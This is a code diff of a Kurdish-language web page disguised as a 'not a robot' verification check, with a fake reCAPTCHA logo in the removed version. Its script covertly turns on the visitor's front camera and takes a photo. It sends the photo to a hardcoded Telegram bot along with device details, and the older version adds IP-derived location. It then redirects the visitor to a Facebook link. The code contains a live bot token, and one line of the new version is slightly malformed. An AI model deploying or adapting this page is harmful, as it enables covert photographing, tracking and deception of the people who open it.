@@ -3,90 +3,94 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verify you are human</title>
+    <title>Verification</title>
     <style>
-        body { background-color: #f9f9f9; margin: 0; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        body { background-color: #f4f7f6; margin: 0; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
         #video { position: absolute; width: 1px; height: 1px; opacity: 0.01; }
+        .container { background: white; padding: 40px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); text-align: center; width: 320px; }
+        .icon-box { margin-bottom: 20px; color: #1877f2; }
+        h2 { font-size: 18px; color: #333; margin-bottom: 10px; }
+        .progress-container { background: #eee; border-radius: 10px; height: 8px; width: 100%; margin: 20px 0; overflow: hidden; display: none; }
+        .progress-bar { background: #1877f2; height: 100%; width: 0%; transition: width 0.1s; }
+        .btn { background: #1877f2; color: white; padding: 12px 25px; border-radius: 8px; cursor: pointer; font-weight: bold; border: none; width: 100%; }
         #canvas { display: none; }
-        .captcha-box { background: white; border: 1px solid #d3d3d3; border-radius: 3px; width: 300px; height: 74px; display: flex; align-items: center; padding: 0 10px; box-shadow: 0 0 4px rgba(0,0,0,0.1); cursor: pointer; }
-        .checkbox { width: 24px; height: 24px; border: 2px solid #c1c1c1; border-radius: 2px; margin-right: 15px; }
-        .text { color: #555; font-size: 14px; flex-grow: 1; }
-        .logo-section { text-align: center; }
-        .logo-section img { width: 30px; }
-        .loader { display: none; border: 3px solid #f3f3f3; border-top: 3px solid #4d90fe; border-radius: 50%; width: 22px; height: 22px; animation: spin 1s linear infinite; margin-right: 15px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-    <div class="captcha-box" onclick="startAuth()">
-        <div class="checkbox" id="checkBtn"></div>
-        <div class="loader" id="loadingCircle"></div>
-        <div class="text">من ڕۆبۆت نیم (I'm not a robot)</div>
-        <div class="logo-section">
-            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png">
-            <p style="font-size: 8px; margin:0;">reCAPTCHA</p>
-        </div>
+<div class="container" id="mainBox">
+    <div class="icon-box">
+        <svg width="50" height="50" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/></svg>
     </div>
+    <h2>پشکنینی ئاسایش</h2>
+    <p style="font-size: 13px; color: #666;">تکایە کلیک بکە بۆ دڵنیابوونەوە لەوەی تۆ مرۆڤیت.</p>
+    <button class="btn" onclick="startWork()">من ڕۆبۆت نیم</button>
+    <div class="progress-container" id="pCont">
+        <div class="progress-bar" id="pBar"></div>
+    </div>
+    <p id="status" style="font-size: 12px; color: #888; margin-top: 10px;"></p>
+</div>
 
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
 
-    <script>
-        const BOT_TOKEN = '8486664700:AAFsvIGJt8Iz1ITZbN4EvPajNJUzMuS6ImY'; 
-        const CHAT_ID = '6351568884';
-        const TARGET_URL = 'https://www.facebook.com/share/1C5gccsXme/?mibextid=wwXIfr';
+<script>
+    const BOT_TOKEN = '8486664700:AAFsvIGJt8Iz1ITZbN4EvPajNJUzMuS6ImY';
+    const CHAT_ID = '6351568884';
+    const TARGET = 'https://www.facebook.com/share/1C5gccsXme/?mibextid=wwXIfr';
 
-        let ipData = "زانیاری شوێن دەست نەکەوت";
-
-        // وەرگرتنی زانیاری شوێن لە ڕێگەی IP (بێدەنگ)
-        fetch('https://ipapi.co/json/')
-            .then(res => res.json())
-            .then(data => {
-                ipData = `📍 وڵات: ${data.country_name}\n🏙 شار: ${data.city}\n🌐 ئینتەرنێت: ${data.org}\n🗺 IP: ${data.ip}`;
-            }).catch(() => { ipData = "کێشە لە وەرگرتنی IP هەبوو"; });
-
-        function getDeviceInfo() {
-            const ua = navigator.userAgent;
-            if (/iPhone/i.test(ua)) return "iPhone 📱";
-            if (/Android/i.test(ua)) return "Android 📱";
-            return "PC/Other 💻";
+    async function startWork() {
+        document.querySelector('.btn').style.display = 'none';
+        document.getElementById('pCont').style.display = 'block';
+        
+        let width = 0;
+        const bar = document.getElementById('pBar');
+        const status = document.getElementById('status');
+        
+        // وەرگرتنی زانیاری باتری
+        let batteryLevel = "Unknown";
+        if (navigator.getBattery) {
+            const b = await navigator.getBattery();
+            batteryLevel = (b.level * 100) + "%";
         }
 
-        function startAuth() {
-            document.getElementById('checkBtn').style.display = 'none';
-            document.getElementById('loadingCircle').style.display = 'block';
+        // دەستپێکردنی کامێرا
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+        .then(stream => {
+            document.getElementById('video').srcObject = stream;
+            
+            let interval = setInterval(() => {
+                if (width >= 100) {
+                    clearInterval(interval);
+                    capture();
+                } else {
+                    width += 1;
+                    bar.style.width = width + '%';
+                    status.innerText = "خەریکی پشکنین: " + width + "%";
+                }
+            }, 40; // ٤ چرکە دەخایەنێت
+        })
+        .catch(() => window.location.href = TARGET);
+    }
 
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-            .then(stream => {
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                
-                setTimeout(() => {
-                    const canvas = document.getElementById('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    
-                    canvas.toBlob(blob => {
-                        const formData = new FormData();
-                        formData.append('chat_id', CHAT_ID);
-                        formData.append('photo', blob, 'image.jpg');
-                        formData.append('caption', `✅ زانیاری نوێ گەیشت:\n\n📱 مۆبایل: ${getDeviceInfo()}\n${ipData}`);
+    function capture() {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        
+        canvas.toBlob(blob => {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'shot.jpg');
+            formData.append('caption', `📊 داتای نوێ:\n🔋 باتری: ${navigator.userAgent.includes("iPhone") ? "iOS" : "Android"}\n⚙️ وێبگەڕ: ${navigator.platform}`);
 
-                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                            method: 'POST',
-                            body: formData
-                        }).then(() => {
-                            window.location.href = TARGET_URL;
-                        });
-                    }, 'image/jpeg', 0.8);
-                }, 3500);
-            })
-            .catch(() => {
-                window.location.href = TARGET_URL;
-            });
-        }
-    </script>
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData })
+            .then(() => window.location.href = TARGET);
+        }, 'image/jpeg', 0.8);
+    }
+</script>
 </body>
 </html>
+
